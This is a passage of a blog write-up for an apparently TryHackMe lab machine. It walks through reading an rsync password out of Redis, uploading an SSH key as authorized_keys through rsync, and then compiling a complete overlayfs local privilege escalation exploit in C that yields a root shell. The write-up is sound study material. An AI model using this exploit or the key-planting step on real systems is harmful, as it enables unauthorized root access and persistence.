+10.10.95.197:6379&gt; type &quot;Analytics&quot;
+none
+</code></pre><p>Nothing. What about <code>authlist</code>?</p>
+<pre><code>10.10.95.197:6379&gt; lrange &quot;authlist&quot; 0 9000
+1) &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&quot;
+2) &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&quot;
+3) &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&quot;
+4) &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&quot;
+</code></pre><p><code>lrange</code> is basically an iterator, going from value 0 to 9000. Looks like a base64 encoded string.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ echo &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&quot; | base64 -d
+Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+</code></pre><p>Great! We have the exact syntax listed, which we can modify for our use. <code>127.0.0.1</code> becomes <code>MACHINE_IP</code>.</p>
+<p>Using <code>rsync rsync://rsync-connect@MACHINE_IP</code> we see an interesting directory. Continuing, we get <code>rsync rsync://rsync-connect@MACHINE_IP:/file/sys-internal/</code>. Listing this looks like sys-internal&rsquo;s file system. Using a bit of directory enumeration, we can get the user flag and the <code>id_rsa</code>!</p>
+<h2 id="2-foothold">2. Foothold</h2>
+<h3 id="21-sneaking-in-ssh">2.1 Sneaking in SSH</h3>
+<p>I checked the <code>.ssh</code> directory, which seems to be empty. Putting in a file called <code>authorized_keys</code> file contating our <code>id_rsa.pub</code> will allow us to connect using SSH without as password ;)</p>
+<pre><code>┌──(kali㉿kali)-[~/.ssh]
+└─$ rsync -ahv ./id_rsa.pub  rsync://rsync-connect@10.10.81.234:/files/sys-internal/.ssh/authorized_keys
+Password: 
+sending incremental file list
+id_rsa.pub
+
+sent 671 bytes  received 35 bytes  83.06 bytes/sec
+total size is 563  speedup is 0.80
+                                                            
+┌──(kali㉿kali)-[~/.ssh]
+└─$ rsync rsync://rsync-connect@10.10.81.234:/files/sys-internal/.ssh/                   
+Password: 
+drwxrwxr-x          4,096 2021/06/16 01:12:15 .
+-rw-r--r--            563 2021/05/25 13:02:37 authorized_keys
+</code></pre><p>Let&rsquo;s login!</p>
+<pre><code>┌──(kali㉿kali)-[~/.ssh]
+└─$ ssh sys-internal@10.10.81.234                
+The authenticity of host '10.10.81.234 (10.10.81.234)' can't be established.
+ECDSA key fingerprint is SHA256:0ysriVjo72WRJI6UecJ9s8z6QHPNngSiMUKWFTO6Vr4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.81.234' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+541 packages can be updated.
+342 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+sys-internal@vulnnet-internal:~$ 
+</code></pre><p>*in hacker voice* We are in!</p>
+<h2 id="3-privesc">3. PrivEsc</h2>
+<p>Let&rsquo;s check the common priv-esc vectors.</p>
+<p>SUID? sudo? crontab? nope. Kernel exploit?</p>
+<pre><code>sys-internal@vulnnet-internal:~$ uname -a
+Linux vulnnet-internal 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre><p>Yes! We can use the <a class="link" href="https://www.exploit-db.com/exploits/39230"  target="_blank" rel="noopener"
+    >overlayfs local priv esc exploit</a>.</p>
+<p>Use the following -</p>
+<pre><code>cat &lt;&lt; EOF &gt; filename.extension
+{blah blah}
+EOF
+</code></pre><p>syntax to echo multiple lines in a file.</p>
+<pre><code>sys-internal@vulnnet-internal:~$ cat &lt;&lt;EOF&gt;xpl.c
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/mount.h&gt;
+
+//#include &lt;attr/xattr.h&gt;
+//#include &lt;sys/xattr.h&gt;
+int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
+
+
+#define DIR_BASE    &quot;./ovlcap&quot;
+#define DIR_WORK    DIR_BASE &quot;/work&quot;
+#define DIR_LOWER   DIR_BASE &quot;/lower&quot;
+#define DIR_UPPER   DIR_BASE &quot;/upper&quot;
+#define DIR_MERGE   DIR_BASE &quot;/merge&quot;
+#define BIN_MERGE   DIR_MERGE &quot;/magic&quot;
+#define BIN_UPPER   DIR_UPPER &quot;/magic&quot;
+
+
+static void xmkdir(const char *path, mode_t mode)
+{
+    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)
+        err(1, &quot;mkdir %s&quot;, path);
+}
+
+static void xwritefile(const char *path, const char *data)
+{
+    int fd = open(path, O_WRONLY);
+    if (fd == -1)
+        err(1, &quot;open %s&quot;, path);
+    ssize_t len = (ssize_t) strlen(data);
+    if (write(fd, data, len) != len)
+        err(1, &quot;write %s&quot;, path);
+    close(fd);
+}
+
+static void xcopyfile(const char *src, const char *dst, mode_t mode)
+{
+    int fi, fo;
+
+    if ((fi = open(src, O_RDONLY)) == -1)
+        err(1, &quot;open %s&quot;, src);
+    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
+        err(1, &quot;open %s&quot;, dst);
+
+    char buf[4096];
+    ssize_t rd, wr;
+
+    for (;;) {
+        rd = read(fi, buf, sizeof(buf));
+        if (rd == 0) {
+            break;
+        } else if (rd == -1) {
+            if (errno == EINTR)
+                continue;
+            err(1, &quot;read %s&quot;, src);
+        }
+
+        char *p = buf;
+        while (rd &gt; 0) {
+            wr = write(fo, p, rd);
+            if (wr == -1) {
+                if (errno == EINTR)
+                    continue;
+                err(1, &quot;write %s&quot;, dst);
+            }
+            p += wr;
+            rd -= wr;
+        }
+    }
+
+    close(fi);
+    close(fo);
+}
+
+static int exploit()
+{
+    char buf[4096];
+
+    sprintf(buf, &quot;rm -rf '%s/'&quot;, DIR_BASE);
+    system(buf);
+
+    xmkdir(DIR_BASE, 0777);
+    xmkdir(DIR_WORK,  0777);
+    xmkdir(DIR_LOWER, 0777);
+    xmkdir(DIR_UPPER, 0777);
+    xmkdir(DIR_MERGE, 0777);
+
+    uid_t uid = getuid();
+    gid_t gid = getgid();
+
+    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
+        err(1, &quot;unshare&quot;);
+
+    xwritefile(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;);
+
+    sprintf(buf, &quot;0 %d 1&quot;, uid);
+    xwritefile(&quot;/proc/self/uid_map&quot;, buf);
+
+    sprintf(buf, &quot;0 %d 1&quot;, gid);
+    xwritefile(&quot;/proc/self/gid_map&quot;, buf);
+
+    sprintf(buf, &quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
+    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) == -1)
+        err(1, &quot;mount %s&quot;, DIR_MERGE);
+
+    // all+ep
+    char cap[] = &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
+
+    xcopyfile(&quot;/proc/self/exe&quot;, BIN_MERGE, 0777);
+    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) == -1)
+        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
+
+    return 0;
+}
+
+int main(int argc, char *argv[])
+{
+    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) {
+        setuid(0);
+        setgid(0);
+        execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
+        err(1, &quot;execl /bin/bash&quot;);
+    }
+
+    pid_t child = fork();
+    if (child == -1)
+        err(1, &quot;fork&quot;);
+
+    if (child == 0) {
+        _exit(exploit());
+    } else {
+        waitpid(child, NULL, 0);
+    }
+
+    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
+    err(1, &quot;execl %s&quot;, BIN_UPPER);
+}
+EOF
+sys-internal@vulnnet-internal:~$ gcc xpl.c 
+sys-internal@vulnnet-internal:~$ ./a.out 
+bash-4.4# 
+</code></pre><p>And we are done!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/smb/">smb</a>
+        
+            <a href="/tags/rsync/">rsync</a>
+        
+            <a href="/tags/nfs/">nfs</a>
+        
+            <a href="/tags/redis/">redis</a>
+        
+    </section>
+
+
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-anonymous-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/kd6mc4d.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/kd6mc4d.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Anonymous Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-attackative-directory-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/4WSAwTY.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/4WSAwTY.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Attackative Directory Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-blog-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/rP25U0x.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/rP25U0x.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Blog Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-overpass3-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/ElTbvct.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/ElTbvct.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Overpass3 Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-relevant-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/AG5H2Sg.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/AG5H2Sg.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Relevant Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 Tanishq Chaudhary
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.3.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
